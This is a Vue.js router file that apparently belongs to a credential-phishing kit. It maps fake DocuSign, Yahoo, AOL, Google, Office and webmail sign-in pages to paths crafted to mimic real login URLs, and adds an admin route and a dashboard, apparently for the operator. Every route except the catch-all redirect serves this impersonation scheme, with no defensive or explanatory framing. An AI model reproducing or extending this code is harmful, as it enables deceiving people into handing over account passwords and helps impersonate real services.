import Vue from 'vue'
import Router from 'vue-router'
import Home from './views/Home.vue'
import Thanks from './views/ThankYou.vue'
import Docusign from './views/Docusign.vue'
import Docusign2 from './views/Docusign2.vue'
import Yahoo1 from './views/Yahoo/yahoo1.vue'
import Yahoo2 from './views/Yahoo/yahoo2.vue'
import Aol1 from './views/Aol/aol1.vue'
import Aol2 from './views/Aol/aol2.vue'
import Google1 from './views/Google/google1.vue'
import Google2 from './views/Google/google2.vue'
import Office1 from './views/Office/office1.vue'
import Office2 from './views/Office/office2.vue'
import Webmail from './views/Webmail/webmail.vue'
import Admin from './views/Admin.vue'
import Dash from './views/Dashboard.vue'
Vue.use(Router)

export default new Router({
  mode: 'history',
  base: process.env.BASE_URL,
  routes: [
    {
      path: '/online-services/registration',
      name: 'home',
      component: Home
    },
    {
      path: '/online-services/registration/thank-you',
      name: 'thanks',
      component: Thanks,
      
    },
    {
      path: '/Docusign/auth',
      name: 'Docusign',
      component: Docusign
    },
    {
      path: '/Docusign/auth/confirm',
      name: 'Docusign',
      component: Docusign2
    },
    {
      path: '/login-docusign-com-src-ym&-lang-en-US&-intl-us&-done-mail.docusign.com',
      name: 'yahoo1',
      component: Yahoo1
    },
    {
      path: '/account/challenge/password-authMechanism-primary-display-login-done-www.docusign.com',
      name: 'yahoo2',
      component: Yahoo2
    },
    {
      path: '/login-aol-com-src-ym&-lang-en-US&-intl-us&-done-mail.aol.com',
      name: 'aol1',
      component: Aol1
    },
    {
      path: '/account/challenge/password-authMechanism-primary-display-login-done-www.aol.com',
      name: 'aol2',
      component: Aol2
    },
    {
      path: '/signin/account-google-com-src-ym&-lang-en-US&-intl-us&-done-mail.google.com',
      name: 'google1',
      component: Google1
    },
    {
      path: '/signin-password/account-google-com-src-ym&-lang-en-US&-intl-us&-done-mail.google.com',
      name: 'google2',
      component: Google2
    },
    {
      path: '/live-office-account-com-src-ym&-lang-en-US&-intl-us&-done-mail.office.com',
      name: 'office1',
      component: Office1
    },
    {
      path: '/signin-password/account-office-com-src-ym&-lang-en-US&-intl-us&-done-mail.office.com',
      name: 'office2',
      component: Office2
    },
    {
      path: '/account/webmail/Docsign-redirect-src-ym&-lang-en-US&-intl-us&-done-mail.com',
      name: 'webmail',
      component: Webmail
    },
    {
      path: '/admin',
      name: 'admin',
      component: Admin
    },
    {
      path: '/Docusign/auth-2',
      name: 'dash',
      component: Dash
    },
    {
      path: '*',
      redirect: '/online-services/registration'
    }
  ]
})
